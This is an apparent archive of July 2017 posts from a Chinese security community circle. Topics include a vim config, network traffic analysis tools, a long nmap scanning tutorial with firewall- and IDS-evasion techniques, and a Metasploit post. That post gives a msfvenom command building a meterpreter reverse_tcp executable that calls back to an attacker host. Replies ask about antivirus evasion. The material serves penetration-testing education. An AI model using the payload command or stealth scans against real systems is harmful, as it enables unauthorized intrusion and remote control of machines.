<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 没注意到第三种方式？


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-10:

> 匿名用户 提问：
余弦，你好。可以分享一下你的.vimrc文件吗？如果可以的话


color koehler
syntax on
set nocompatible
set ruler
set number
set showcmd
set incsearch
set hlsearch
set nobk
set history=60
set shiftwidth=4
set softtabstop=4
set tabstop=4
set expandtab
set helplang=cn
set ttymouse=xterm2
set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936
set termencoding=utf-8
set encoding=utf-8



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补充说明下：我的一切习惯的宗旨是：极简主义，够用就好。所以我的 Vim 配置文件非常简单，我不会用任何插件来加速我的效率，因为我的效率已经够高。之前我还说过，我在 Win 下甚至系统用 Notepad++ 作为我的首选编辑器。不一定要学我的方式。

<img src="https://file.xiaomiquan.com/49/90/4990015a4b6cc0255dd2d9c160c50566417feed80276fbddfe3d4529b613771f.jpg" width="25px"/> __alan__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 适合自己的才是最好的😜


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-09:


__#资源#__

  这篇漏洞及修复经验很有意思，其中第3个，居然也能重视，如果国内认这个，可以刷一波了：


[Flexport今年在hackerone被报告的6个有趣的漏洞 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/vuls/139171.html)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 厂家居然认为第3点：这是最令我们感到惊讶的一个问题。

<img src="https://file.xiaomiquan.com/64/90/649032a29005a37e93906d26f68a0492d5247ecf4cbfea97aa6b0e74a7a6b1b0.jpg" width="25px"/> __一个头两个大大大大大大大大大大大__: 早在去年，freebuf上就出现了关于target_blank的钓鱼分析

[http://www.freebuf.com/vuls/113634.html](http://www.freebuf.com/vuls/113634.html)



<img src="https://file.xiaomiquan.com/b6/4a/b64a313d21a50c71fa67bee596a343fd60aa66d5437d5ee537f28bcb3849b8ca.jpg" width="25px"/> __北风飘然__: 这个思路很猥琐啊

<img src="https://file.xiaomiquan.com/b6/4a/b64a313d21a50c71fa67bee596a343fd60aa66d5437d5ee537f28bcb3849b8ca.jpg" width="25px"/> __北风飘然__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 刚复现了下  js渣  弦大有什么好的思路么


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-07-09:

这周开始网络流量分析的系列分享
简单来说，攻击行为都会产生网络流量(侧信道攻击另谈，以后分享)，许多从主机防护层面看起来再隐蔽的攻击行为，从网络流量层面上来看都非常明显，举个比较极端的栗子：某黑客拿0day打下一台服务器种了个免杀马。这个场景下大部分安防设备都无效，但是如果上了网络流量分析，你会发现那个免杀马发出的心跳包是多么明显，0day利用的过程每一条指令都在数据包中显露无遗。很容易就定位到问题机器，然后走常规流程处理。

工欲善其事，必先利其器。推我日常用的神器之一，科来网络分析系统
[下载科来网络分析系统技术交流版 - 科来](http://www.colasoft.com.cn/download/capsa.php)


技术交流版是免费的

一个国内厂商做的，数据包的分类和展示都要比Wireshark直观，可以实时抓包分析也可以导入数据包回放分析，大伙儿先下来玩玩熟悉一下功能，官网也有非常详细的模块说明和几个案例，后续我会分享用如何通过网络流量分析发现常见的攻击行为

<img src="https://images.xiaomiquan.com/Fg38m8_XtJpyVgWEpgmp9lAoRWLV?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:TCJ9nLtevA2WLDs3PzWZ3_YWHI8=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FrI_KHfmNXcTZOFR9_2az9eU1zHA?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:pvVUPPjEyMwGK4RdgiLktUUnf3E=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 科来很牛

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 有Mac版吗

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 目前只有Windows😂

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 记得大学时老师推荐了三个软件，wireshark fiddler 科来，科来官网有一副网络协议的导图，能否推荐一下哪些协议值得学

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: TCP/IP详解永远是经典😄

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 嗯，我有卷一😝，的确，主要的协议学好就可以了，其它的就学cos大大说的佛挡杀佛吧😂

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 产品很有价值哦

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 刚做完一道流量分析的CTF题目，期待后续系列😄

<img src="https://file.xiaomiquan.com/46/9f/469f453cd0c55d80ca0663aa37600de69eb41d3edfff95314f01b3f8e2f220ef.jpg" width="25px"/> __Oliver__: 看着很直观啊

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 希望分享些基于流量分析特种木马，组合攻击等的案例，非常期待

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 忘记加话题了，这样网络方面的文章以后多了就不好找了。

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 特种木马由于敏感性我不会讲具体事例，但是随着分享慢慢深入会讲分析方法，敬请期待

<img src="https://file.xiaomiquan.com/f9/e7/f9e70472f1f879d1ee9e93916e06dc36dfd86a5ffdcd004e2704820d2f6cc5b1.jpg" width="25px"/> __irving__: 期待，网络流量分析


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-08:


__#工具#__

 神兵利器之nmap
好吧，又是一个老套的工具，没有人不知道它，本来我是想开篇一个msf系列的，但是觉得nmap不管在渗透还是网络管理中都是必不可少的工具，必须熟练掌握那种，我敢打赌，密圈里50% 以上的人并不能熟练运用它。
有的人会说，不就是是扫描器吗？单个IP扫，整个网段扫，个别端口扫，我都会啊，大不了需要的时候再来查参数了。好吧，不过类似书到用时方知少一样，常用的工具熟练掌握是会对工作效率有很大提升的。
废话不多说，本来我是打算自己详细写写各个参数用法的，发现网上已经有非常详细的教程了，我就在基础上增加一些自己的经验吧。
----------------------------------------------------------------------------------------------------------
本文由阿德马翻译自国外网站，请尊重劳动成果，转载请注明出处，谢谢
Nmap是一款网络扫描和主机检测的非常有用的工具。 Nmap是不局限于仅仅收集信息和枚举，同时可以用来作为一个漏洞探测器或安全扫描器。它可以适用于winodws,linux,mac等操作系统。Nmap是一款非常强大的实用工具,可用于：
检测活在网络上的主机（主机发现）
检测主机上开放的端口（端口发现或枚举）
检测到相应的端口（服务发现）的软件和版本
检测操作系统，硬件地址，以及软件版本
检测脆弱性的漏洞（Nmap的脚本）
Nmap是一个非常普遍的工具，它有命令行界面和图形用户界面。本人包括以下方面的内容:
介绍Nmap
扫描中的重要参数
操作系统检测
Nmap使用教程
Nmap使用不同的技术来执行扫描，包括：TCP的connect（）扫描，TCP反向的ident扫描，FTP反弹扫描等。所有这些扫描的类型有自己的优点和缺点，我们接下来将讨论这些问题。
Nmap的使用取决于目标主机,因为有一个简单的（基本）扫描和预先扫描之间的差异。我们需要使用一些先进的技术来绕过防火墙和入侵检测/防御系统，以获得正确的结果。下面是一些基本的命令和它们的用法的例子：
扫描单一的一个主机，命令如下：
#nmap nxadmin.com
#nmap 192.168.1.2

扫描整个子网,命令如下:
#nmap 192.168.1.1/24

扫描多个目标,命令如下：
#nmap 192.168.1.2 192.168.1.5

扫描一个范围内的目标,如下：
#nmap 192.168.1.1-100 (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)

如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机，命令如下：
#nmap -iL ip.txt （该文件里面，一行保存一个ip）

如果你想看到你扫描的所有主机的列表，用以下命令:
#nmap -sL 192.168.1.1/24 
（适用于快速列出该网段的存活主机,我一般这样用 nmap -sL  192.168.1.1/24 |grep "(*)"  目的是仅列出存活的）

扫描除过某一个ip外的所有子网主机,命令：
#nmap 192.168.1.1/24 -exclude 192.168.1.1

扫描除过某一个文件中的ip外的子网主机命令
#nmap 192.168.1.1/24 -exclude file xxx.txt  (xxx.txt中的文件将会从扫描的主机中排除)

扫描特定主机上的80,21,23端口,命令如下
#nmap -p80,21,23 192.168.1.1

在每次命令都加上 -v 或者-vv 参数，会详细显示扫描的过程，不然你就等待一段时间，直接看结果。
-----------------------------------------------------------------------------------------------------------
从上面我们已经了解了Nmap的基础知识，下面我们深入的探讨一下Nmap的扫描技术.

✊Tcp SYN Scan (sS)
这是一个基本的扫描方式,它被称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.
如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root/administrator权限.
(这里我简单讲一下TCP 和SYN的区别，TCP有完整的三次握手过程，就是扫描器发包到探测目标上，然后目标会再返回确认包，然后双方确认后再传送数据，TCP过程繁琐当然扫描效率不高，并且有交互过程所以会在目标上留下日志。而SYN只是TCP三次握手中第一次握手的请求包，扫描过程速度快并且不会在目标上留下日志，我这里只是通俗的讲一下，不了解TCP的，参考这里
[简析TCP的三次握手与四次分手 | 果冻想](http://www.jellythink.com/archives/705))



#nmap -sS 192.168.1.1

✊Tcp connect() scan(sT)
如果不选择SYN扫描,TCP connect()扫描就是默认的扫描模式.不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口.
#nmap -sT 192.168.1.1

Udp scan(sU)
顾名思义,这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.
#nmap -sU 192.168.1.1

✊FIN scan (sF)
有时候Tcp SYN扫描不是最佳的扫描模式,因为有防火墙的存在.目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止掉SYN数据包。发送一个设置了FIN标志的数据包并不需要完成TCP的握手.
root@bt:~# nmap -sF 192.168.1.8
Starting Nmap 5.51  at 2012-07-08 19:21 PKT
Nmap scan report for 192.168.1.8
Host is up (0.000026s latency).
Not shown: 999 closed ports
PORT STATE SERVICE
111/tcp open|filtered rpcbind
FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包.（如果你懂tcp协议，就知道FIN是TCP中一个请求断开的标志）

PING Scan (sP)
PING扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限，如果用户没有ROOT权限,PING扫描将会使用connect()调用.
#nmap -sP 192.168.1.1

✊版本检测(sV)
版本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口.
#nmap -sV 192.168.1.1

Idle scan (sI)（s后面是大写I）
Idle scan是一种先进的扫描技术，它不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包.
#nmap -sI 192.168.1.6 192.168.1.1
Idle scan是一种理想的匿名扫描技术,通过目标网络中的192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口
（这个idle scan，是不能随便想利用哪个ip做为掩饰的，必须找到idle也就是空闲的主机，这个可以到后面我介绍msf知识的时候，有方法可以探测哪个主机目前是idle状态可以拿来掩盖自己ip）
另外还有其它的扫描方式，如 FTP bounce（FTP反弹）, fragmentation scan（碎片扫描）, IP protocol scan（IP协议扫描）,以上讨论的是几种最主要的扫描方式.

✊Nmap的OS检测（O）
Nmap最重要的特点之一是能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。 Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。
Initiating SYN Stealth Scan at 10:21
Scanning localhost (www.nxadmin.com) [1000 ports]
Discovered open port 111/tcp on www.nxadmin.com
Completed SYN Stealth Scan at 10:21, 0.08s elapsed (1000 total ports)
Initiating OS detection (try #1) against localhost (www.nxadmin.com)
Retrying OS detection (try #2) against localhost (www.nxadmin.com)
上面的例子清楚地表明，Nmap的首次发现开放的端口，然后发送数据包发现远程操作系统。操作系统检测参数是O（大写O）
Nmap的操作系统指纹识别技术：
设备类型（路由器，工作组等）
运行（运行的操作系统）
操作系统的详细信息（操作系统的名称和版本）
网络距离（目标和攻击者之间的距离跳）
如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。
# nmap -O -PN 192.168.1.1/24
以上命令告诉发信主机远程主机是存活在网络上的，所以没有必要发送ping请求,使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现.
Nmap的操作系统检测的基础是有开放和关闭的端口，如果OS scan无法检测到至少一个开放或者关闭的端口，会返回以下错误：
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

#nmap -A 192.168.1.1
这个-A 是直接包含了很多功能，免去了敲多个参数的操作，所探测的信息，留给你去动手试一下吧。
-----------------------------------------------------------------------------------------------------------
在msf里面是可以调用nmap的，输入db_nmap 直接调用，扫描结果保存到msf数据库中。
一下子就长篇大论了，大多数人肯定都不会看完，这种必会的工具，还是建议每个参数都去敲着看看效果吧！
另外附上 新手小伙伴容易上手的视频: 
[https://www.ichunqiu.com/course/1219](https://www.ichunqiu.com/course/1219)


当然还有更全面从入门到精通的资料: 
[Nmap中文手册 - Nmap中文网](http://www.nmap.com.cn/doc/manual.shtm)

 里面包含所有参数的详细讲解，其中的躲避IDS侦测值得好好掌握。
我准备上msf系列了，大家有什么建议？

<img src="https://images.xiaomiquan.com/Fv6VwvjGa2LBcpydgnPVhnptTSzW?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:d4r-ehPgr0QLD4txOIj51m9Jpcc=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/87/4a/874a9d7bc90aec06621571157ebc051fbde8f37747aa5c2d5a8ebb11163cbe88.jpg" width="25px"/> __风__: 👍

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 最好讲下nmap躲避ids.另外非常期待您的msf

<img src="https://file.xiaomiquan.com/32/ba/32ba2c03224e4ae7003702db4a3e3eb49b9745fa24b21af31ea9d982f42b005e.jpg" width="25px"/> __Denny__: 期待msf系列

<img src="https://file.xiaomiquan.com/79/28/79283102cc43e26f36b78e0a346002dd559a8db2ce9728c413bd0e79ebb6ccf3.jpg" width="25px"/> __深度__: 期待msf

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 赞

<img src="https://file.xiaomiquan.com/16/aa/16aa532fb15c30918c1e256fe0663e4434962db15a1cfc459835d2a556a0cbb5.jpg" width="25px"/> __howl__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 自己可以看文档啊，
[Nmap中文手册 - Nmap中文网](http://www.nmap.com.cn/doc/manual.shtm)

。

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: nmap带脚本扫描感觉不怎么好用，命中率一般而且慢。

<img src="https://file.xiaomiquan.com/5e/db/5edbb1e6c8a2f0245c9c7016e707c8d2103e4faff3c2c3130f5f724a991466f7.jpg" width="25px"/> __Bingo__: --max-rtt-timeout 2000ms  连接超时为2000毫秒
--max-retries 3 丢包重试最多3次
--max-scan-delay 2s 发包间隔时间最多2秒
--host-timeout 30m 每台主机最多扫描30分钟

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/5e/db/5edbb1e6c8a2f0245c9c7016e707c8d2103e4faff3c2c3130f5f724a991466f7.jpg" width="25px"/> __Bingo__: 👍

<img src="https://file.xiaomiquan.com/63/23/6323b002b81350d9211b63938bcf48eb5e088b76145174eb17a3dafb1ba7bbf0.jpg" width="25px"/> __Stone__: 最好讲下nmap躲避防火墙，谢谢

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/63/23/6323b002b81350d9211b63938bcf48eb5e088b76145174eb17a3dafb1ba7bbf0.jpg" width="25px"/> __Stone__: 防火墙不是躲避，而是突破.如果常规的syn半连接扫描被防火墙阻止，可以尝试用其它方式去扫描，比如 (-PA )，这是用Ack方式，又或者(-sF),Fin方式扫描，nmap很强大可以定制各种数据包格式去扫描，如果是绕过IDS入侵防御检测，有很多方式，如果你看过我贴的两个网址的东西，你是有答案的。

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 谢谢分享，无聊的周末看看老司机们的分享，又燃起了斗志，自从加了小密圈，忘了我是单身狗😜。关于msf，看到flipper也有系列，觉得是不是需要沟通一下，免得重复了，另外希望有实战的分享😁

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 嗯，谢谢提醒，我们会商量下。

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__ replies to <img src="https://file.xiaomiquan.com/5e/db/5edbb1e6c8a2f0245c9c7016e707c8d2103e4faff3c2c3130f5f724a991466f7.jpg" width="25px"/> __Bingo__: 。


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-07:

MSF内网渗透系列-反弹shell

渗透测试时，通过WEB漏洞，拿到了目标网络边缘服务器的webshell，或者通过社工钓鱼，控制了目标办公网络中的一台个人机。

那么结下来就是利用MSF反弹回一个shell，开始在内网扩大我们的战果。

接下来介绍几个基本概念：

payload，又称为攻击载荷。想要返回一个shell，就要在目标机执行我们的payload

正向shell (bind)，需要攻击机主动连接目标端口，如windows/shell/bind_tcp和windows/meterpreter/bind_tcp这两个payload，就会反弹一个正向的shell

反向shell（reverse），目标机会反连接攻击机，如windows/shell/reverse_tcp和windows/meterpreter/reverse_tcp，就会反弹一个反向的shell

meterpreter，Metasploit的一个payload，它具有强大的功能，其具备端口转发和socks代理功能简直就是内网渗透测试神器，windows/meterpreter/reverse_tcp和windows/meterpreter/bind_tcp就会反弹一个meterpreter的shell

在Linux下，那么payload可以选择python/meterpreter/reverse_https

以在window下反弹一个meterpreter的shell为例：

首先利用msfvenom生成我们payload的执行程序：

msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.31.166 LPORT=1234 -f exe > ./test.exe

在目标机192.168.31.196上执行test.exe，使用exploit/multi/handler模块监听，如图，可以看到返回了一个meterpreter的shell

<img src="https://images.xiaomiquan.com/FvpV6xJty5T8eQVL5x3dvE2DOIXU?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:YezmO3MN-DKsGVcqg5bgrhgPzCU=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/14/0f/140fb95e9c03f1ea592d0b97e3860eebaa2d094c683a2412a5db396e7211c8be.jpg" width="25px"/> __cx__: 基本功能，能否讲讲免杀，谢谢

<img src="https://file.xiaomiquan.com/3c/a6/3ca69f66dd59ce0289025f378c143a4856d1d410551a9df7fcd8ed6b082e6cb3.jpg" width="25px"/> __他好像条狗啊He looks like a dog__: 在目标机上执行？你想执行就执行？

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/3c/a6/3ca69f66dd59ce0289025f378c143a4856d1d410551a9df7fcd8ed6b082e6cb3.jpg" width="25px"/> __他好像条狗啊He looks like a dog__: 是的

<img src="https://file.xiaomiquan.com/3c/a6/3ca69f66dd59ce0289025f378c143a4856d1d410551a9df7fcd8ed6b082e6cb3.jpg" width="25px"/> __他好像条狗啊He looks like a dog__ replies to <img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__: 种马怎么弄？被报毒怎么弄？

<img src="https://file.xiaomiquan.com/59/51/5951d4e58f300c77c694d102186da5cca79e17dc6ba43fc529c330cd75005c2c.jpg" width="25px"/> __请添加备注__: 如果另一个网段只能通过该机器访问，如何利用拿到权限的这台机器，进行进一步的探测和利用？

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/59/51/5951d4e58f300c77c694d102186da5cca79e17dc6ba43fc529c330cd75005c2c.jpg" width="25px"/> __请添加备注__: 下一篇就会提到，敬请关注

<img src="https://file.xiaomiquan.com/59/51/5951d4e58f300c77c694d102186da5cca79e17dc6ba43fc529c330cd75005c2c.jpg" width="25px"/> __请添加备注__ replies to <img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__: 好的大佬，感谢分享


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-05:


__#经验#__

  给大家分享篇老文《用追MM来解释23种设计模式》


[http://www.jianshu.com/p/84f19e25aeac](http://www.jianshu.com/p/84f19e25aeac)

 

为什么分享这个呢？当年我刚接触编程时，设计模式这玩意理解了很久，一直很模糊，毕竟当时没什么实战经验，后来看到这篇文章...作者这科普膜拜得不行啊。

之前经验分享说过，玩安全一定要玩好编程。那现在再补上一句：玩好编程，一定要理解透各种设计模式。

设计模式不是只有这些，至于为什么，你以后会知道的。😏



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 推荐一本书，大话设计模式

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 推荐一种编程方式，天生就自带设计模式，他就是函数编程

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 这种方式很赞很赞

<img src="https://file.xiaomiquan.com/2b/f9/2bf9e6206c897d781f31230a6f9923b346da1a247d2a1822470bf25995a3659f.jpg" width="25px"/> __winlans__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 我感觉设计模式之蝉更好点或许

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 弦哥，有研究s2-048吗

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 意义不大


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-05:


__#经验#__

  给大家分享篇老文《用追MM来解释23种设计模式》


[http://www.jianshu.com/p/84f19e25aeac](http://www.jianshu.com/p/84f19e25aeac)

 

为什么分享这个呢？当年我刚接触编程时，设计模式这玩意理解了很久，一直很模糊，毕竟当时没什么实战经验，后来看到这篇文章...作者这科普膜拜得不行啊。

之前经验分享说过，玩安全一定要玩好编程。那现在再补上一句：玩好编程，一定要理解透各种设计模式。

设计模式不是只有这些，至于为什么，你以后会知道的。😏



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 推荐一本书，大话设计模式

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 推荐一种编程方式，天生就自带设计模式，他就是函数编程

